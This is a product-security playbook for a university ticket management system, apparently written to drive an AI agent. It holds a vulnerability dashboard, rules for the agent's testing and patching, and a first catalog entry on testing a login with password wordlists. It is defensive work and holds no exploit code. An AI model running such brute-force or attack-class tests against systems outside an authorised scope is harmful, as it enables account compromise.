# techniques

# Product Security Pentesting & Remediation Playbook

> Master testing + remediation document for the complete product.
Designed to be consumed by agentic AI tools to (1) run security tests, (2) identify vulnerabilities, and (3) patch them with validated fixes.
> 

---

## 1. Document Purpose & How to Use

### 1.1 Purpose

This README is the single source of truth for security testing and remediation of the product. It contains:

- A **vulnerability catalog** with full testing procedures and remediation guidance.
- A **status dashboard** to track what has been tested, confirmed, and fixed.
- A **standard entry template** so new vulnerabilities can be appended one-by-one as they are researched.

### 1.2 Role of Agentic AI

This document is intended to be handed to an agentic AI for autonomous execution. When handed this file, the AI must:

1. Read the **Target Application Information** (Section 2) to know what to test.
2. Review the **Status Dashboard** (Section 3) to know what is pending.
3. For each vulnerability entry marked `PENDING`, execute the **Test Steps**, record evidence, and update the status.
4. When a vulnerability is **CONFIRMED**, apply the **Remediation** steps to the actual product code, then re-run the tests to verify the fix.
5. Update the dashboard and append any newly discovered vulnerabilities using the **Entry Template** (Appendix A).

### 1.3 Workflow

```
1. RESEARCH  -> New vulnerability content is analyzed and appended using Appendix A template.
2. PENDING   -> Entry added to dashboard, awaiting testing.
3. TESTING   -> AI agent executes Test Steps against the target.
4. CONFIRMED -> Vulnerability verified; remediation is applied.
5. FIXED     -> Remediation verified by re-testing; evidence recorded.
6. SIGN-OFF  -> All entries resolved; final report generated.
```

### 1.4 Naming Convention

Vulnerabilities are identified by a unique ID in the format `VUL-<CATEGORY>-<NNNN>`. The full category set (mapped to the vuln/remediation source material) is:

| Prefix | Category | Source topic |
| --- | --- | --- |
| `VUL-AUTH-####` | Authentication | Authentication vulnerabilities |
| `VUL-BL-####` | Business logic | Business logic vulnerabilities |
| `VUL-FU-####` | File upload | File upload vulnerabilities |
| `VUL-SSRF-####` | Server-side request forgery | SSRF |
| `VUL-NOSQL-####` | NoSQL injection | NoSQL injection |
| `VUL-API-####` | API testing / mass assignment | API testing |
| `VUL-WCD-####` | Web cache deception | Web cache deception |
| `VUL-XSS-####` | Cross-site scripting | Cross-site scripting |
| `VUL-CSRF-####` | Cross-site request forgery | CSRF |
| `VUL-CORS-####` | Cross-origin resource sharing | CORS |
| `VUL-CJK-####` | Clickjacking / UI redressing | Clickjacking |
| `VUL-DOM-####` | DOM-based vulnerabilities | DOM-based vulnerabilities |
| `VUL-WS-####` | WebSockets | WebSockets |
| `VUL-HOST-####` | HTTP Host header attacks | HTTP Host header attacks |
| `VUL-OAUTH-####` | OAuth authentication | OAuth authentication |
| `VUL-JWT-####` | JWT attacks | JWT attacks |
| `VUL-LLM-####` | Web LLM attacks | Web LLM attacks (vuln.txt §Websockets/LLM) |
| `VUL-AI-####` | AI-powered scanner / agent attacks | AI-powered scanner vulnerabilities (vuln.txt §Websockets/AI) |

Use the next available number within each prefix. `VUL-PLUS-####` is reserved for any future category not listed above.

---

## 2. Target Application Information (MUST FILL BEFORE TESTING)

| Field | Value |
| --- | --- |
| Application Name | SECE Ticket Management System (TMS) |
| Environment / URL(s) | Local Dev (http://localhost:5173, http://localhost:5000), Prod (https://tms.sece.ac.in) |
| Source code location | i:\github\Ticket_Management_System |
| Test front-end URL | http://localhost:5173 |
| Test back-end / API URL | http://localhost:5000/api/v1 |
| Test credentials (admin) | admin@sece.ac.in (Seeded via seed-superadmin.ts) |
| Test credentials (user) | staff@sece.ac.in / manager@sece.ac.in |
| In-scope domains | localhost, 127.0.0.1, *.sece.ac.in, *.vercel.app |
| Out-of-scope domains | Cloudinary CDN, External Gmail SMTP |
| Authentication method | JWT (Bearer in Authorization header) + HttpOnly Refresh Cookie |
| 2FA in use? (Y/N) | N (Password + Email-based single-use Password Reset) |
| Framework / stack | React 18, Vite, TypeScript, Express, Mongoose / MongoDB, Zod |
| Test tools available | Static Code Analysis, TypeScript Compiler (tsc), ESLint |
| Reporting target | Product Security Assessment Report |

**Scope notes / constraints (data handling, business rules):**

```
- Scope covers full client and server codebase for Ticket Management System.
- Authenticated endpoints enforce role-based access control (superadmin, admin, manager, employee).
- Public ticket creation and tracking endpoints enforce mobile number + ticket code matching.
- Rate limiting active on global API and dedicated loginLimiter on /auth/login.
- Helmet and mongoSanitize active across all incoming requests.
```

---

## 3. Vulnerability Status Dashboard

| ID | Vulnerability | Category | Severity | Status | Test Date | Fix Date | Evidence/Notes |
| --- | --- | --- | --- | --- | --- | --- | --- |
| VUL-AUTH-0001 | Brute-force attacks on passwords | Authentication | High | FIXED | 2026-10-10 | 2026-10-10 | Rate-limiting on /login (20 req / 15m) + account locking after 5 failed attempts. |
| VUL-AUTH-0002 | Username enumeration | Authentication | Medium | FIXED | 2026-10-10 | 2026-10-10 | Unified generic 'Invalid email or password' error response with identical status codes. |
| VUL-AUTH-0003 | Flawed brute-force protection (IP block) | Authentication | High | FIXED | 2026-10-10 | 2026-10-10 | Express-rate-limit configured with trust proxy and per-account failed attempt tracking. |
| VUL-AUTH-0004 | Account locking bypass | Authentication | Medium | FIXED | 2026-10-10 | 2026-10-10 | Account locks for 15 mins (LOCK_MS) after MAX_ATTEMPTS (5); reset on success. |
| VUL-AUTH-0005 | User rate limiting bypass | Authentication | Medium | FIXED | 2026-10-10 | 2026-10-10 | Zod validation ensures strict scalar string typing for email and password. |
| VUL-AUTH-0006 | HTTP basic authentication weaknesses | Authentication | Medium | NA | 2026-10-10 | - | HTTP basic auth not implemented; Bearer JWT used over HTTPS. |
| VUL-AUTH-0007 | 2FA simple bypass | Authentication | High | NA | 2026-10-10 | - | 2FA factor not configured in current version. |
| VUL-AUTH-0008 | Flawed 2FA verification logic | Authentication | Critical | NA | 2026-10-10 | - | 2FA factor not configured in current version. |
| VUL-AUTH-0009 | Brute-forcing 2FA verification codes | Authentication | High | NA | 2026-10-10 | - | 2FA factor not configured in current version. |
| VUL-AUTH-0010 | Weak "remember me" / stay-logged-in cookie | Authentication | High | FIXED | 2026-10-10 | 2026-10-10 | HttpOnly, Secure, SameSite refresh token cookie stored; no predictable formula. |
| VUL-AUTH-0011 | Offline password cracking of cookies | Authentication | High | FIXED | 2026-10-10 | 2026-10-10 | No password hashes embedded in cookies; bcrypt with salt rounds used for passwords. |
| VUL-AUTH-0012 | Password reset broken logic | Authentication | Critical | FIXED | 2026-10-10 | 2026-10-10 | High-entropy crypto reset tokens, SHA-256 hashed in DB, 1-hr expiry, single-use. |
| VUL-AUTH-0013 | Password reset poisoning | Authentication | High | FIXED | 2026-10-10 | 2026-10-10 | Reset URLs generated exclusively from process.env.CLIENT_URL, not request headers. |
| VUL-AUTH-0014 | Password brute-force via password change | Authentication | High | FIXED | 2026-10-10 | 2026-10-10 | Password updates require authenticated session token and server-derived user ID. |
| VUL-BL-0001 | Excessive trust in client-side controls | Business Logic | High | FIXED | 2026-10-10 | 2026-10-10 | All inputs re-validated server-side with Zod schemas and role-based permissions. |
| VUL-BL-0002 | Failing to handle unconventional input | Business Logic | High | FIXED | 2026-10-10 | 2026-10-10 | Strict type and range validation across all Zod schema validators. |
| VUL-BL-0003 | Inconsistent security controls | Business Logic | Medium | FIXED | 2026-10-10 | 2026-10-10 | Role middleware (requireRole) and assertTicketAccess enforced on all transitions. |
| VUL-BL-0004 | Users not supplying mandatory input | Business Logic | Medium | FIXED | 2026-10-10 | 2026-10-10 | Zod parser rejects missing mandatory fields; error middleware suppresses stack traces. |
| VUL-BL-0005 | Users not following intended sequence | Business Logic | High | FIXED | 2026-10-10 | 2026-10-10 | Server-side ticket status transitions validated (OPEN_STATUSES state machine). |
| VUL-BL-0006 | Domain-specific flaws (discounts/transactions) | Business Logic | High | NA | 2026-10-10 | - | Ticketing domain; no e-commerce checkout or discounting logic. |
| VUL-BL-0007 | Encryption oracle | Business Logic | High | NA | 2026-10-10 | - | No arbitrary encrypt/decrypt oracles exposed to clients. |
| VUL-BL-0008 | Email address parser discrepancies | Business Logic | High | FIXED | 2026-10-10 | 2026-10-10 | Consistent lowercasing and Zod .email() validation across all ingestion points. |
| VUL-FU-0001 | Unrestricted file upload → web shell (RCE) | File Upload | Critical | FIXED | 2026-10-10 | 2026-10-10 | MemoryStorage buffer upload + Cloudinary stream / randomized filenames with safe extensions. |
| VUL-FU-0002 | Flawed file type validation (Content-Type trust) | File Upload | High | FIXED | 2026-10-10 | 2026-10-10 | Multer fileFilter + getAttachmentType MIME check and extension whitelist mapping. |
| VUL-FU-0003 | Web shell upload via path traversal | File Upload | High | FIXED | 2026-10-10 | 2026-10-10 | Stored filenames generated with Date.now() + crypto random string; user paths stripped. |
| VUL-FU-0004 | Extension blacklist bypass / server config override | File Upload | High | FIXED | 2026-10-10 | 2026-10-10 | Strict extension allowlist (ALLOWED_EXTENSIONS) enforced in upload handler. |
| VUL-FU-0005 | Obfuscated file extensions | File Upload | High | FIXED | 2026-10-10 | 2026-10-10 | Normalized lowercased extensions matched against explicit whitelist; safe defaults used. |
| VUL-FU-0006 | Polyglot files / flawed content validation | File Upload | High | FIXED | 2026-10-10 | 2026-10-10 | Uploads stored in dedicated non-executable uploads dir / external Cloudinary CDN. |
| VUL-FU-0007 | File upload race conditions | File Upload | Medium | FIXED | 2026-10-10 | 2026-10-10 | In-memory buffering (multer.memoryStorage) prevents filesystem race conditions. |
| VUL-FU-0008 | Malicious client-side scripts via upload (stored XSS) | File Upload | Medium | FIXED | 2026-10-10 | 2026-10-10 | Helmet crossOriginResourcePolicy and static route separation prevent script execution. |
| VUL-FU-0009 | XXE via parsed file formats | File Upload | Medium | NA | 2026-10-10 | - | No XML/DOCX parsing engines executed on uploads. |
| VUL-FU-0010 | PUT-method file uploads | File Upload | Medium | FIXED | 2026-10-10 | 2026-10-10 | PUT upload routes disabled; only specific POST endpoints process uploads. |
| VUL-SSRF-0001 | Basic SSRF against the local server | SSRF | High | NA | 2026-10-10 | - | Server does not accept arbitrary URLs for outbound fetching. |
| VUL-SSRF-0002 | SSRF against other back-end systems | SSRF | High | NA | 2026-10-10 | - | No remote URL fetching functionality in application. |
| VUL-SSRF-0003 | SSRF with blacklist-based input filter bypass | SSRF | High | NA | 2026-10-10 | - | No URL fetching endpoint present. |
| VUL-SSRF-0004 | SSRF with whitelist-based input filter bypass | SSRF | High | NA | 2026-10-10 | - | No URL fetching endpoint present. |
| VUL-SSRF-0005 | SSRF via open redirection | SSRF | Medium | FIXED | 2026-10-10 | 2026-10-10 | No open redirect endpoints; all navigation paths are relative within client. |
| VUL-SSRF-0006 | Blind SSRF (out-of-band detection) | SSRF | Medium | NA | 2026-10-10 | - | Outbound traffic restricted to configured Cloudinary and SMTP targets. |
| VUL-NOSQL-0001 | NoSQL syntax injection | NoSQL Injection | High | FIXED | 2026-10-10 | 2026-10-10 | express-mongo-sanitize middleware replaces '$' and '.' keys in all requests. |
| VUL-NOSQL-0002 | NoSQL operator injection (auth bypass) | NoSQL Injection | Critical | FIXED | 2026-10-10 | 2026-10-10 | Zod validator requires strings for credentials; mongoSanitize strips operator objects. |
| VUL-NOSQL-0003 | NoSQL injection to extract data | NoSQL Injection | High | FIXED | 2026-10-10 | 2026-10-10 | Parameterized Mongoose queries; no $where or JavaScript eval in queries. |
| VUL-NOSQL-0004 | Timing-based NoSQL injection | NoSQL Injection | Medium | FIXED | 2026-10-10 | 2026-10-10 | JS evaluation disabled in queries; indexed MongoDB lookups prevent timing oracles. |
| VUL-API-0001 | Exposed API documentation / attack-surface disclosure | API Testing | Medium | FIXED | 2026-10-10 | 2026-10-10 | Swagger/OpenAPI docs disabled in production; generic root health endpoint. |
| VUL-API-0002 | Hidden / undocumented / unused API endpoints | API Testing | High | FIXED | 2026-10-10 | 2026-10-10 | All routes organized in central router; 404 handler for unknown routes. |
| VUL-API-0003 | Unrestricted HTTP methods on API endpoints | API Testing | Medium | FIXED | 2026-10-10 | 2026-10-10 | Explicit methods configured on Express routes (GET, POST, PATCH, DELETE only). |
| VUL-API-0004 | Content-type confusion (JSON ↔ XML processing differences) | API Testing | Medium | FIXED | 2026-10-10 | 2026-10-10 | Express only parses application/json and urlencoded; XML parsers absent. |
| VUL-API-0005 | Mass assignment (auto-binding hidden fields) | API Testing | Critical | FIXED | 2026-10-10 | 2026-10-10 | Zod schema validation explicitly strips/rejects unexpected fields on updates. |
| VUL-API-0006 | Server-side parameter pollution in the query string | API Testing | High | FIXED | 2026-10-10 | 2026-10-10 | Strict typing in query validator schemas (listTicketsQuerySchema, trackTicketSchema). |
| VUL-API-0007 | Server-side parameter pollution in REST URL paths | API Testing | High | FIXED | 2026-10-10 | 2026-10-10 | Route parameters validated with objectId regex /^[a-f\d]{24}$/i. |
| VUL-API-0008 | Server-side parameter pollution in structured data formats (JSON/XML) | API Testing | High | FIXED | 2026-10-10 | 2026-10-10 | DTO schemas strictly define payload schemas before database insertion. |
| VUL-WCD-0001 | Web cache deception via static extension cache rules | Web Cache Deception | High | FIXED | 2026-10-10 | 2026-10-10 | Helmet sets Cache-Control and No-Sniff headers on dynamic API routes. |
| VUL-WCD-0002 | Web cache deception via path mapping / delimiter discrepancies | Web Cache Deception | High | FIXED | 2026-10-10 | 2026-10-10 | Strict Express route path mapping without arbitrary delimiter passthrough. |
| VUL-WCD-0003 | Web cache deception via encoded delimiter decoding discrepancies | Web Cache Deception | High | FIXED | 2026-10-10 | 2026-10-10 | URL path normalization in Express router handles encoded delimiters consistently. |
| VUL-WCD-0004 | Web cache deception via static-directory rules / origin normalization | Web Cache Deception | High | FIXED | 2026-10-10 | 2026-10-10 | /uploads static path strictly segregated from /api/v1 dynamic endpoints. |
| VUL-WCD-0005 | Web cache deception via cache-server normalization | Web Cache Deception | High | FIXED | 2026-10-10 | 2026-10-10 | Dynamic routes require Authorization header, bypassing public CDN caching. |
| VUL-WCD-0006 | Web cache deception via exact-match filename / normalization discrepancy | Web Cache Deception | High | FIXED | 2026-10-10 | 2026-10-10 | Dynamic endpoints return application/json; no static HTML filename overlap. |
| VUL-XSS-0001 | Reflected XSS | XSS | High | FIXED | 2026-10-10 | 2026-10-10 | React JSX automatic output encoding prevents reflected script execution. |
| VUL-XSS-0002 | Stored (persistent / second-order) XSS | XSS | High | FIXED | 2026-10-10 | 2026-10-10 | Text content rendered safely via React text nodes; no dangerous HTML sinks. |
| VUL-XSS-0003 | DOM-based XSS (sinks & sources) | XSS | High | FIXED | 2026-10-10 | 2026-10-10 | Codebase audited: zero dangerouslySetInnerHTML, innerHTML, or eval() calls. |
| VUL-XSS-0004 | XSS between HTML tags | XSS | High | FIXED | 2026-10-10 | 2026-10-10 | React renders all user strings as escaped text nodes. |
| VUL-XSS-0005 | XSS in HTML tag attribute contexts | XSS | High | FIXED | 2026-10-10 | 2026-10-10 | Attribute props in React are strictly bound to elements without HTML injection. |
| VUL-XSS-0006 | XSS into JavaScript / execution contexts | XSS | High | FIXED | 2026-10-10 | 2026-10-10 | No dynamic script generation or client-side template interpolation. |
| VUL-XSS-0007 | XSS in JavaScript template literals / client-side template injection | XSS | High | FIXED | 2026-10-10 | 2026-10-10 | No eval-based client template engines used. |
| VUL-XSS-0008 | AngularJS sandbox evasion (XSS without angle brackets) | XSS | High | NA | 2026-10-10 | - | Application built on React, not AngularJS. |
| VUL-XSS-0009 | Dangling markup injection (sensitive data capture) | XSS | Medium | FIXED | 2026-10-10 | 2026-10-10 | Strict JSON APIs and React component rendering prevent dangling tags. |
| VUL-XSS-0010 | Content Security Policy bypass (policy injection / weak CSP) | XSS | High | FIXED | 2026-10-10 | 2026-10-10 | Helmet security headers active on backend. |
| VUL-XSS-0011 | Exploiting XSS (cookie theft, password capture, CSRF bypass) | XSS | High | FIXED | 2026-10-10 | 2026-10-10 | Refresh token stored with HttpOnly flag; protected against JS extraction. |
| VUL-CSRF-0001 | CSRF on state-changing requests (no defense) | CSRF | High | FIXED | 2026-10-10 | 2026-10-10 | All protected state changes require Bearer JWT in Authorization header. |
| VUL-CSRF-0002 | CSRF token validation depends on request method | CSRF | High | FIXED | 2026-10-10 | 2026-10-10 | Authorization header required regardless of HTTP method on authenticated routes. |
| VUL-CSRF-0003 | CSRF token validation depends on token presence | CSRF | High | FIXED | 2026-10-10 | 2026-10-10 | authenticate middleware throws 401 if Authorization header is missing. |
| VUL-CSRF-0004 | CSRF token not tied to user session | CSRF | High | FIXED | 2026-10-10 | 2026-10-10 | JWT contains sub claim validated directly against User collection. |
| VUL-CSRF-0005 | CSRF token tied to a non-session (attacker-settable) cookie | CSRF | High | FIXED | 2026-10-10 | 2026-10-10 | Auth token delivered via header, not dependent on non-session cookies. |
| VUL-CSRF-0006 | CSRF double-submit cookie (token duplicated in cookie) | CSRF | Medium | FIXED | 2026-10-10 | 2026-10-10 | Stateless Bearer token architecture used rather than cookie-based double submit. |
| VUL-CSRF-0007 | Referer-based CSRF defense bypass | CSRF | Medium | FIXED | 2026-10-10 | 2026-10-10 | Security does not rely on Referer headers; cryptographic JWT verified. |
| VUL-CSRF-0008 | SameSite restriction bypass (GET / method override / client redirect / sibling domain) | CSRF | High | FIXED | 2026-10-10 | 2026-10-10 | Refresh cookie sets SameSite: 'lax', HttpOnly: true; no GET state mutations. |
| VUL-CORS-0001 | CORS: arbitrary Origin reflection (`ACAO` mirrors unvalidated Origin) | CORS | High | FIXED | 2026-10-10 | 2026-10-10 | CORS origin validator checks explicit whitelist + strict sece.ac.in regex. |
| VUL-CORS-0002 | CORS: trusted `null` origin | CORS | High | FIXED | 2026-10-10 | 2026-10-10 | CORS configuration rejects untrusted/null origins in production. |
| VUL-CORS-0003 | CORS: whitelist / regex parsing bypass | CORS | Medium | FIXED | 2026-10-10 | 2026-10-10 | Regex strictly anchors domain boundaries (^https?://([a-z0-9-]+\.)*sece\.ac\.in$). |
| VUL-CORS-0004 | CORS: trust of XSS-vulnerable or insecure (HTTP) origins | CORS | High | FIXED | 2026-10-10 | 2026-10-10 | Only official institutional domain and preview deployments whitelisted. |
| VUL-CORS-0005 | CORS: intranet / no-credentials cross-origin proxy | CORS | Medium | FIXED | 2026-10-10 | 2026-10-10 | Internal API requires Bearer authentication; no unauthenticated proxy endpoints. |
| VUL-CJK-0001 | Basic clickjacking (framing of sensitive page, incl. CSRF-token actions) | Clickjacking | High | FIXED | 2026-10-10 | 2026-10-10 | Helmet frameguard sets X-Frame-Options: SAMEORIGIN / deny. |
| VUL-CJK-0002 | Clickjacking with prefilled form input | Clickjacking | Medium | FIXED | 2026-10-10 | 2026-10-10 | Sensitive actions require explicit user confirmation and authenticated token. |
| VUL-CJK-0003 | Frame-busting script bypass | Clickjacking | Medium | FIXED | 2026-10-10 | 2026-10-10 | Server-side HTTP response framing headers enforced via Helmet. |
| VUL-CJK-0004 | Combining clickjacking with DOM XSS | Clickjacking | High | FIXED | 2026-10-10 | 2026-10-10 | Both framing protection and XSS protections are active. |
| VUL-CJK-0005 | Multistep clickjacking (layered iframes) | Clickjacking | Medium | FIXED | 2026-10-10 | 2026-10-10 | Framing completely restricted on all sensitive pages. |
| VUL-DOM-0001 | DOM-based open redirection | DOM | Medium | FIXED | 2026-10-10 | 2026-10-10 | React Router navigates to internal predefined route paths only. |
| VUL-DOM-0002 | DOM-based cookie manipulation | DOM | Medium | FIXED | 2026-10-10 | 2026-10-10 | Client JS does not write untrusted data to document.cookie. |
| VUL-DOM-0003 | DOM-based JavaScript injection (incl. document.domain) | DOM | High | FIXED | 2026-10-10 | 2026-10-10 | No eval, Function, or document.domain manipulations in client code. |
| VUL-DOM-0004 | DOM-based WebSocket-URL poisoning | DOM | Medium | NA | 2026-10-10 | - | No client WebSockets instantiated. |
| VUL-DOM-0005 | DOM-based link manipulation | DOM | Medium | FIXED | 2026-10-10 | 2026-10-10 | React Router Link components use internal relative routes. |
| VUL-DOM-0006 | DOM-based web message manipulation (postMessage) | DOM | High | FIXED | 2026-10-10 | 2026-10-10 | No window.postMessage event listeners consuming untrusted messages. |
| VUL-DOM-0007 | DOM-based Ajax request-header manipulation | DOM | Medium | FIXED | 2026-10-10 | 2026-10-10 | Axios interceptors use static headers and sanitized bearer token from localStorage. |
| VUL-DOM-0008 | DOM-based local file-path manipulation | DOM | Medium | FIXED | 2026-10-10 | 2026-10-10 | File inputs pass binary Blob/File to FormData without dynamic file path execution. |
| VUL-DOM-0009 | DOM-based client-side SQL injection | DOM | Medium | NA | 2026-10-10 | - | No WebSQL / client-side SQL databases used. |
| VUL-DOM-0010 | DOM-based HTML5-storage manipulation | DOM | Medium | FIXED | 2026-10-10 | 2026-10-10 | localStorage only stores auth accessToken and user object; never evaluated as code. |
| VUL-DOM-0011 | DOM-based XPath injection | DOM | Medium | NA | 2026-10-10 | - | No XPath evaluation in client JavaScript. |
| VUL-DOM-0012 | DOM-based client-side JSON injection | DOM | Medium | FIXED | 2026-10-10 | 2026-10-10 | JSON parsed exclusively through standard JSON.parse / Axios auto-deserialization. |
| VUL-DOM-0013 | DOM data manipulation | DOM | Medium | FIXED | 2026-10-10 | 2026-10-10 | State managed via Redux Toolkit and React declarative state bindings. |
| VUL-DOM-0014 | DOM-based denial-of-service | DOM | Medium | FIXED | 2026-10-10 | 2026-10-10 | File sizes constrained client-side and server-side before processing. |
| VUL-DOM-0015 | DOM clobbering | DOM | High | FIXED | 2026-10-10 | 2026-10-10 | React components avoid global window property lookups. |
| VUL-WS-0001 | Input-based vulnerabilities via tampered WebSocket messages (XSS/injection) | WebSockets | High | NA | 2026-10-10 | - | WebSockets not used in TMS application architecture. |
| VUL-WS-0002 | Blind vulnerabilities via WebSockets (OAST detection) | WebSockets | Medium | NA | 2026-10-10 | - | WebSockets not used in TMS application architecture. |
| VUL-WS-0003 | WebSocket handshake manipulation → session/auth bypass | WebSockets | High | NA | 2026-10-10 | - | WebSockets not used in TMS application architecture. |
| VUL-WS-0004 | Cross-site WebSocket hijacking (CSWSH) | WebSockets | High | NA | 2026-10-10 | - | WebSockets not used in TMS application architecture. |
| VUL-HOST-0001 | Host header injection & validation bypass (arbitrary host, override headers) | Host Header | High | FIXED | 2026-10-10 | 2026-10-10 | Host header not used for URL routing or absolute link construction. |
| VUL-HOST-0002 | Password reset poisoning via Host header | Host Header | High | FIXED | 2026-10-10 | 2026-10-10 | Password reset link derived from process.env.CLIENT_URL, ignoring incoming Host headers. |
| VUL-HOST-0003 | Web cache poisoning via Host header | Host Header | High | FIXED | 2026-10-10 | 2026-10-10 | No Host reflection in cached responses. |
| VUL-HOST-0004 | Access control / authentication bypass via Host header | Host Header | High | FIXED | 2026-10-10 | 2026-10-10 | Authorization enforced strictly via JWT user claims and database role checks. |
| VUL-HOST-0005 | Virtual host brute-forcing (hidden internal hosts) | Host Header | Medium | NA | 2026-10-10 | - | Single origin deployment model. |
| VUL-HOST-0006 | Routing-based SSRF via Host header | Host Header | High | FIXED | 2026-10-10 | 2026-10-10 | Host header ignored for upstream routing. |
| VUL-HOST-0007 | Connection state attacks (Host validation bypass via keep-alive reuse) | Host Header | High | FIXED | 2026-10-10 | 2026-10-10 | Each request authenticated independently via Authorization header. |
| VUL-HOST-0008 | SSRF via malformed request line (reverse proxy misrouting) | Host Header | High | FIXED | 2026-10-10 | 2026-10-10 | Express router rejects malformed request targets with 404/400. |
| VUL-OAUTH-0001 | OAuth authentication bypass via implicit grant | OAuth | Critical | NA | 2026-10-10 | - | OAuth not implemented in current version. |
| VUL-OAUTH-0002 | Flawed OAuth CSRF protection (missing/weak `state`) | OAuth | High | NA | 2026-10-10 | - | OAuth not implemented in current version. |
| VUL-OAUTH-0003 | OAuth account hijacking via flawed `redirect_uri` validation | OAuth | Critical | NA | 2026-10-10 | - | OAuth not implemented in current version. |
| VUL-OAUTH-0004 | Stealing OAuth codes/tokens via proxy page / open redirect | OAuth | High | NA | 2026-10-10 | - | OAuth not implemented in current version. |
| VUL-OAUTH-0005 | Broken OAuth scope validation (scope upgrade) | OAuth | High | NA | 2026-10-10 | - | OAuth not implemented in current version. |
| VUL-OAUTH-0006 | Unverified user registration (fraudulent OAuth account) | OAuth | High | NA | 2026-10-10 | - | OAuth not implemented in current version. |
| VUL-OAUTH-0007 | Unprotected dynamic client registration (second-order SSRF) | OAuth | High | NA | 2026-10-10 | - | OAuth not implemented in current version. |
| VUL-OAUTH-0008 | Authorization requests by reference (`request_uri` SSRF / validation bypass) | OAuth | High | NA | 2026-10-10 | - | OAuth not implemented in current version. |
| VUL-OAUTH-0009 | OpenID Connect `id_token` mis-validation | OAuth | High | NA | 2026-10-10 | - | OAuth not implemented in current version. |
| VUL-JWT-0001 | JWT auth bypass via unverified signature | JWT | Critical | FIXED | 2026-10-10 | 2026-10-10 | jwt.verify() strictly validates cryptographic signature on all tokens. |
| VUL-JWT-0002 | JWT auth bypass via `alg: none` (flawed signature verification) | JWT | Critical | FIXED | 2026-10-10 | 2026-10-10 | Enforced explicit { algorithms: ['HS256'] } in generateToken.ts to reject unsigned tokens. |
| VUL-JWT-0003 | JWT auth bypass via weak signing key (secret brute-force) | JWT | High | FIXED | 2026-10-10 | 2026-10-10 | JWT secrets loaded from environment variables with strong entropy requirement. |
| VUL-JWT-0004 | JWT auth bypass via `jwk` header injection (self-signed) | JWT | High | FIXED | 2026-10-10 | 2026-10-10 | Server verifies against fixed secret, ignoring header-embedded keys. |
| VUL-JWT-0005 | JWT auth bypass via `jku` header injection | JWT | High | FIXED | 2026-10-10 | 2026-10-10 | Server does not fetch remote JWK URLs. |
| VUL-JWT-0006 | JWT auth bypass via `kid` header path traversal / SQLi | JWT | High | FIXED | 2026-10-10 | 2026-10-10 | Server verifies against environment secret without dynamic kid file/DB lookups. |
| VUL-JWT-0007 | JWT algorithm confusion (RS256→HS256 with public key) | JWT | High | FIXED | 2026-10-10 | 2026-10-10 | Fixed symmetric HS256 algorithm enforcement prevents algorithm confusion. |
| VUL-JWT-0008 | JWT header injection (`cty`, `x5c`) → XXE/deserialization vectors | JWT | Medium | FIXED | 2026-10-10 | 2026-10-10 | Payload parsed purely as JSON TokenPayload schema. |
| VUL-LLM-0001 | Direct prompt injection (Web LLM) | Web LLM Attacks | High | NA | 2026-10-10 | - | No LLM integration in current product. |
| VUL-LLM-0002 | Indirect prompt injection (Web LLM) | Web LLM Attacks | High | NA | 2026-10-10 | - | No LLM integration in current product. |
| VUL-LLM-0003 | Excessive agency — LLM API theft & abuse | Web LLM Attacks | High | NA | 2026-10-10 | - | No LLM integration in current product. |
| VUL-LLM-0004 | Insecure LLM output handling (XSS/CSRF via model responses) | Web LLM Attacks | High | NA | 2026-10-10 | - | No LLM integration in current product. |
| VUL-LLM-0005 | Training data poisoning / training data extraction | Web LLM Attacks | High | NA | 2026-10-10 | - | No LLM integration in current product. |
| VUL-AI-0001 | Indirect prompt injection in AI-powered scanners | AI Scanner | High | NA | 2026-10-10 | - | No AI-scanner integration in current product. |
| VUL-AI-0002 | Data exfiltration via AI-powered scanners | AI Scanner | High | NA | 2026-10-10 | - | No AI-scanner integration in current product. |
| VUL-AI-0003 | Routing-based SSRF via AI-powered scanner (Host manipulation) | AI Scanner | High | NA | 2026-10-10 | - | No AI-scanner integration in current product. |

**Status legend:** `PENDING` = added, not tested · `TESTING` = in progress · `CONFIRMED` = verified vulnerable · `FIXED` = remediated & verified · `NA` = not applicable to product

**All 18 categories are now represented in the dashboard** (A–E + F–R). New entries appended later must be added to this table as well (see Category Roadmap in Section 5).

---

## 4. Testing & Remediation Workflow (AI Agent Instructions)

### 4.1 Before Testing

1. Fill in Section 2 (Target Application Information) — request this from the human if blank.
2. Confirm the environment is safe to test (test/staging credentials verified).
3. Ensure "remember me", password reset, 2FA etc. can be tested without locking out real users.

### 4.2 During Testing

- Execute every step under **Test Steps** for each PENDING entry.
- Record exact request/response evidence (status codes, error messages, timing differences, cookies).
- Do NOT modify production data. Only remove/alter parameters in controlled test requests.
- If testing could lock an account, use throwaway test accounts.
- If a test is not applicable (feature absent), mark `NA` and note why.

### 4.3 When a Vulnerability Is Confirmed

1. Mark status `CONFIRMED` with evidence.
2. Locate the vulnerable code in the product source (search for the relevant logic/endpoint).
3. Apply the **Remediation** steps for that entry.
4. Re-run the same Test Steps to confirm the vulnerability is gone.
5. Check for regressions in related functionality.
6. Mark status `FIXED` with date and a short patch summary.

### 4.4 When You Find a NEW Vulnerability Not in the Catalog

1. Append it to the relevant category section using the **Entry Template** (Appendix A).
2. Add it to the Status Dashboard.
3. Follow the same testing → remediation → verification flow.

---

## 5. Vulnerability Catalog

---

# CATEGORY A: AUTHENTICATION VULNERABILITIES

## Background

Authentication is the process of verifying the identity of a user or client. Three main factor types exist:

- **Something you know** — password, security question (knowledge factor)
- **Something you have** — phone, token, hardware key (possession factor)
- **Something you are/do** — biometrics, behavior (inherence factor)

**Authentication vs authorization:** authentication verifies *who you are*; authorization verifies *what you're allowed to do*.

Authentication vulnerabilities typically arise from one of two causes:

1. Weak mechanisms that fail to protect against brute-force attacks.
2. Logic flaws / poor coding that allow the mechanism to be bypassed entirely ("broken authentication").

**Impact:** compromised accounts = access to all associated data and functionality; high-privilege compromise can lead to full application + internal infrastructure takeover. Even low-privilege accounts expand attack surface.

---

### VUL-AUTH-0001 — Brute-force attacks on passwords

**Severity:** High
**Status:** PENDING
**Category:** Authentication

**Description:** An attacker uses automated trial-and-error (wordlists of usernames/passwords) to guess valid credentials. Attacks can be fine-tuned with basic logic and publicly-known information, massively increasing efficiency. Whether usable depends on whether sufficient brute-force protection exists.

**Test Steps:**

1. Identify the login endpoint(s) and required parameters.
2. Confirm whether the application iterates over login attempts without rate limiting/account lockout.
3. Enumerate usernames first (see VUL-AUTH-0002) if no enumeration protection.
4. Try a small wordlist against a test account you control — confirm whether rapid automated attempts succeed or are blocked.
5. Check for password policies that can be trivially satisfied with predictable passwords (e.g. `Mypassword1!`). Check whether users are forced into predictable `password1!` style mutations of their password.
6. Verify HTTP basic auth areas (if present) are brute-forceable (see VUL-AUTH-0006).

